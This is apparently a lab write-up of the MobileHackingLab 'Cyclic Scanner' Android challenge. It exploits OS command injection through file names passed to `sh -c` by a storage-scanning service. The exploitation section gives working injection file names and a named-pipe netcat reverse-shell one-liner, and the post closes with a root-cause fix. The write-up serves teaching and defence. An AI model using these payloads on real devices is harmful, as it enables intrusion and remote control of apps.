---
title: "MHL Cyclic Scanner Writeup"
date: 2026-10-13
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, service, command-injection, external-storage, rce]
---

A writeup of the MobileHackingLab "Cyclic Scanner" challenge: finding and exploiting an OS command injection vulnerability in an Android background service to achieve remote code execution as the app's UID.

## Objective

The lab's stated goal is simple: exploit a vulnerability inherent to an Android service to achieve remote code execution. No flag to hunt, just RCE as the proof of impact.

## Static Analysis

The app, Cyclic Scanner, runs a background `ScanService` that periodically walks the device's external storage looking for malware by hash. Decompiling with jadx surfaced two relevant classes.

### ScanService

```java
@Override
public void onCreate() {
    super.onCreate();
    createNotificationChannel();
    HandlerThread thread = new HandlerThread("ServiceStartArguments", 10);
    thread.start();
    this.serviceLooper = thread.getLooper();
    this.serviceHandler = new ServiceHandler(this, thread.getLooper());
}
```

Key properties:

- `onStartCommand` returns `START_STICKY`, so Android restarts the service if it's killed.
- `handleMessage` recursively reschedules itself every `SCAN_INTERVAL` (6000 ms) via `sendMessageDelayed`, creating a persistent scan loop.
- The loop walks `Environment.getExternalStorageDirectory()` recursively with `FilesKt.walk`, and for every readable regular file calls `ScanEngine.scanFile(file)`.

The attack surface is therefore the entire contents of external storage, including file and directory names, which any app with storage access (or an attacker with physical/adb access) can populate.

### ScanEngine

```java
public final boolean scanFile(File file) {
    String command = "toybox sha1sum " + file.getAbsolutePath();
    Process process = new ProcessBuilder(new String[0])
        .command("sh", "-c", command)
        .directory(Environment.getExternalStorageDirectory())
        .redirectErrorStream(true)
        .start();
    ...
}
```

This is the vulnerability. The file's absolute path is concatenated directly into a shell command string, which is then handed to `sh -c`. Because `ProcessBuilder` invokes a shell instead of executing `toybox` with separate arguments (`exec(String[])`), any shell metacharacter in the file's path is parsed as shell syntax rather than treated as a literal filename. A filename is attacker-controlled input; this is classic OS command injection via an unsanitized file path.

### Manifest review

```xml
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
<uses-permission android:name="android.permission.INTERNET"/>
...
<service android:name="...ScanService" android:exported="false"/>
```

`ScanService` is not exported, so it cannot be started directly via an intent from another app or from adb as the shell user. It can only be reached by the app's own UI (`MainActivity`, which is exported), by enabling the scanner there. Once running, the service is attacker-reachable indirectly: anything that can write to shared storage can trigger the vulnerable code path. The `MANAGE_EXTERNAL_STORAGE` and `INTERNET` permissions define the blast radius once code executes as the app: full access to shared storage and outbound network.

## Exploitation

### 1. Trigger the service

```sh
adb shell am start -n com.mobilehackinglab.cyclicscanner/.MainActivity
adb shell appops set com.mobilehackinglab.cyclicscanner MANAGE_EXTERNAL_STORAGE allow
```

The app op grant is required because `MANAGE_EXTERNAL_STORAGE` is not a normal runtime permission and `pm grant` does not apply to it. The scanner is then enabled from the UI, which starts the foreground service and its 6-second scan loop (confirmed via `adb logcat | grep System.out`).

### 2. First injection attempt and a false start

The naive approach is to encode the payload directly in the filename:

```sh
adb shell touch "/sdcard/;touch proof"
```

This initially appeared to fail, `proof` never appeared. The cause: the command above (poorly quoted) actually created a *directory* named `;touch proof`, not a file. `ScanService` filters with `file.isFile()`, so directories are silently skipped by the walker and never reach `scanFile`. Lesson: verify what was actually created (`ls -la`) before assuming the injection itself is broken.

Corrected as a regular file:

```sh
adb shell 'touch "/sdcard/;touch proof"'
```

The scanner picked it up on its next tick and `proof` appeared in `/sdcard`, confirming arbitrary command execution.

### 3. Filesystem constraints

`/sdcard` on Android is a FUSE-backed emulated volume that inherits FAT-style filename restrictions. The following characters cannot appear in a filename at all:

```
< > : " / \ | ? *
```

Attempting to create a file containing `<` or `>` (for shell redirection) failed outright:

```
touch: '/sdcard/;nc 127.0.0.1 8888 0<&1 1>&1 2>&1': Operation not permitted
```

This is a filesystem-level rejection, not a shell parsing issue, so the payload has to avoid those characters entirely. This rules out redirection syntax directly in the filename and significantly limits what a single-stage payload can express.

### 4. Toybox netcat limitations

Android ships toybox's netcat, not GNU or BusyBox netcat. Its outbound client mode does not support `-e` or `-c` to spawn a shell on connect, those flags don't exist in toybox. A direct `nc IP PORT sh` style invocation connects but does not reliably wire a shell to the socket as a client; toybox only documents COMMAND-on-connect behavior for listen mode.

### 5. Two-stage payload: filename as a bootstrap

The combination of a short, character-restricted injection point and a limited shell toolset meant the filename could not carry the full exploit. The fix was to split the payload:

**Stage 1**, a script file written normally (not through the injection), so its *contents* are unrestricted:

```sh
adb shell "printf 'rm -f /data/local/tmp/f; mkfifo /data/local/tmp/f; cat /data/local/tmp/f | sh -i 2>&1 | nc 127.0.0.1 8888 > /data/local/tmp/f\n' > /sdcard/shell"
```

This is a standard named-pipe (FIFO) reverse shell: a FIFO loops netcat's incoming data into an interactive `sh`, and `sh`'s output pipes back out through netcat to the listener. The FIFO lives under `/data/local/tmp` rather than `/sdcard`, since the latter's FAT-like semantics don't reliably support named pipes.

**Stage 2**, the injection filename itself, reduced to the minimum needed to chain to the script:

```sh
adb shell 'touch "/sdcard/;sh shell"'
```

Because `ScanEngine` sets the process's working directory to `/sdcard`, `sh shell` resolves as a bare relative path with no slash required, working around the filename's slash restriction entirely.

When concatenated, the full command the service executes becomes:

```
toybox sha1sum /storage/emulated/0/;sh shell
```

The leading `sha1sum` call against a path ending abruptly in `/` fails harmlessly, the shell then proceeds to the injected `sh shell`.

### 6. Catching the shell

```sh
# listener
nc -lvnp 8888

# tunnel device localhost back to the attacking host
adb reverse tcp:8888 tcp:8888
```

On the next scan tick (within 6 seconds), the service executed the payload file, and a shell landed in the listener:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 49985
u0_a113:.$ id
uid=10113(u0_a113) gid=10113(u0_a113) ...
```

`u0_a113` is the Cyclic Scanner app's own UID, not the adb shell user. This is the proof of impact: code execution achieved purely through the vulnerable service's own data-processing path, as the target application, which the adb shell user could never reach directly since the service is non-exported.

## Root Cause and Fix

The root cause is building a shell command string via concatenation with attacker-influenced input (the file path) and executing it through `sh -c`. The fix is to avoid a shell entirely:

```java
// Preferred: compute the hash natively, no subprocess at all
MessageDigest digest = MessageDigest.getInstance("SHA-1");

// If a subprocess is required, pass arguments as an array with no shell:
new ProcessBuilder("toybox", "sha1sum", file.getAbsolutePath()).start();
```

Passing arguments as a `String[]` to `ProcessBuilder` means the OS invokes the binary directly with each argument as a literal value; no shell parses the string, so metacharacters in the filename have no special meaning.

## Key Takeaways

- **`ProcessBuilder("sh", "-c", concatenatedString)` is command injection whenever any part of the concatenated string is attacker-influenced**, even when the attacker-controlled value is something as seemingly inert as a filename.
- **Filenames are an underrated injection vector.** Any app that walks shared storage and shells out using a path is exposed to every other app, or any physically-present attacker, that can write to that storage.
- **Environment constraints shape exploitation, not just detection.** FAT filename restrictions and a stripped-down toybox userland forced a two-stage payload: a character-unrestricted script file plus a minimal, character-safe injection string that bootstraps it. This "small trusted trigger, large untrusted payload elsewhere" pattern generalizes well beyond this lab.
- **Verify assumptions at each step.** A `touch` that silently created a directory instead of a file, and a netcat flag that doesn't exist in toybox, each looked like injection failures but were actually tooling mismatches once inspected directly.

## Tools Used

- jadx (decompilation of `ScanService` / `ScanEngine`)
- adb (`shell`, `reverse`, `logcat`)
- netcat (toybox variant, device side; GNU netcat, listener side)
